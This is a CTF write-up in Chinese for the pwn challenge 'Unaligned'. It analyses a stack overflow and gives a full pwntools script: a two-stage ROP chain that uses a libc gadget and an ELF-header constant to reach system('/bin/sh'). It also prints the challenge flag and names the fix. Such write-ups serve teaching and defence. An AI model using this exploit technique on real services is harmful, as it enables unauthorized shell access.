# Unaligned

## 题目简述

程序先泄露 `system` 地址，然后对一个 `0x120` 字节的局部数组执行长度为 `0x200` 的 `memset`，主动破坏 saved RBP 和返回地址。随后唯一可控的读取从 `name+0x100` 开始，长度只有 `0x40`，刚好覆盖 32 字节填充、saved RBP 和三项 8 字节 ROP 数据。

二进制启用了 PIE、NX 和 Full RELRO，但没有栈 Canary。利用不需要改写 GOT：先用泄露计算 libc 基址，再借助 libc 中一个会把 `RSI` 增加 `0x40` 的特殊 gadget，把第二阶段 ROP 读到初始输入范围之后。

## 解题过程

源代码中的两个关键操作为：

```c
char name[0x120] = { '\0' };

memset(name, (int)'A', 0x200);
printf("Gift: %p\n", system);
read_str("Name: ", name + 0x100, 0x40);
```

`Gift` 直接给出 `system` 的运行时地址，因此 libc 基址可由 $\text{system leak}-\text{system offset}$ 得到。初始输入距 saved RBP 只有 `0x20` 字节，后面总共只能放入三个地址，普通 ret2libc 链空间不足。

所给 libc 中存在 gadget：

```text
add rsi, qword ptr [rbp - 0x6b]
mov rax, rdi
ret
```

ELF64 文件头偏移 `0x20` 处的 `e_phoff` 在该 libc 中为 `0x40`。将 saved RBP 设为 `libc_base + 0x20 + 0x6b`，就有：

```text
[rbp - 0x6b] = [libc_base + 0x20] = 0x40
```

在题目给定二进制中，`read_str()` 返回后 `RSI` 仍指向第一次输入缓冲区，`RDI=0`、`RDX=0x40` 也可供下一次 `read` 使用。第一阶段链先把 `RSI` 向后移动 `0x40`，调用 libc 的 `read` 把第二阶段写到当前栈指针即将到达的位置，再经过同一 gadget 返回到新写入的链：

```python
from pwn import ELF, ROP, context, flat, remote

exe = context.binary = ELF("./unaligned", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = remote("127.0.0.1", 1337)

io.recvuntil(b"Gift: ")
system_leak = int(io.recvline(), 16)
libc.address = system_leak - libc.sym.system

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
add_rsi = libc.address + 0x131C03

fake_rbp = libc.address + 0x20 + 0x6B
stage1 = flat(
    b"B" * 0x20,
    fake_rbp,
    add_rsi,
    libc.sym.read,
    add_rsi,
)

io.sendafter(b"Name: ", stage1)

stage2 = flat(
    pop_rdi,
    next(libc.search(b"/bin/sh\x00")),
    libc.sym.system,
)
io.send(stage2)
io.interactive()
```

第二阶段执行 `system("/bin/sh")`，随后可读取：

```text
shellmates{SOrRY_fOR_f0RciBLy_Un$4tify1ng_0ne_g4DGet_CoN$tr41nT$}
```

## 方法总结

本题的难点是 ROP 空间而不是地址随机化：libc 地址已直接泄露，但初始覆盖窗口只能容纳三项控制数据。解法把 ELF 头中稳定存在的 `0x40` 当作常量来源，以特殊 gadget 调整 `RSI`，再用一次 `read` 将可用栈空间向后延伸。

这种链依赖给定二进制在调用结束后的寄存器状态和指定 libc 的 gadget，迁移到其他编译结果或 libc 时必须重新核对反汇编。根本修复很直接：`memset` 长度必须使用 `sizeof(name)`，所有后续读入也应进行边界检查；栈 Canary 可增加检测能力，但不能替代长度修正。
